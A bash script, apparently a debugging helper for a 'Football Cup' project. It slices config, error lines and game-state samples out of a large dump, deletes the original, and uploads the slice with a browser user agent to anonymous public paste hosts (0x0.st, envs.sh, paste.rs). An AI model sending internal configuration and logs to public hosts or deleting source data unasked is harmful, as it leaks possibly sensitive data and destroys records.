#!/usr/bin/env bash
# Football Cup — make a TINY truncated slice from existing ~/fc-dump.txt, free disk, upload.
set +e
SRC="$HOME/fc-dump.txt"
SMALL="$HOME/fc-small.txt"

rm -f "$SMALL"   # free the 64MB bloated slice first (disk is full)

if [ ! -s "$SRC" ]; then
  echo "no ~/fc-dump.txt — run the full pull first"; exit 1
fi

{
  echo "### CONFIG (runtimes + gateways) ###"
  sed -n '/## RUNTIMES ##/,/## LOGS ##/p' "$SRC" | cut -c1-2000
  echo
  echo "### ERRORS (truncated) ###"
  grep -iaE 'KeyError|Traceback|Exception|ValidationException|AccessDenied|denied|throttl|MissingRequired|invalid|notfound|error' "$SRC" | head -80 | cut -c1-800
  echo
  echo "### SCHEMA SAMPLES (gameState/ball/players, truncated) ###"
  grep -aE '"ball"|"players"|gameState|passer_position|shooter_position|goalkeeper_position|should_shoot|success_probability' "$SRC" | head -8 | cut -c1-2500
} > "$SMALL" 2>/dev/null

rm -f "$SRC"   # free the 600k-line monster now that we've sliced it

SL=$(wc -l < "$SMALL"); SB=$(wc -c < "$SMALL")
echo "slice: $SL lines / $SB bytes, uploading..."
UA="Mozilla/5.0 (X11; Linux x86_64)"
URL=""
URL=$(curl -fsS -A "$UA" -F "file=@$SMALL" https://0x0.st 2>/dev/null)
[ -z "$URL" ] && URL=$(curl -fsS -A "$UA" -F "file=@$SMALL" https://envs.sh 2>/dev/null)
[ -z "$URL" ] && URL=$(curl -fsS --data-binary @"$SMALL" https://paste.rs 2>/dev/null)
echo "=================================================="
echo "DUMP URL: $URL"
echo "  (slice $SL lines / $SB bytes)"
echo "=================================================="
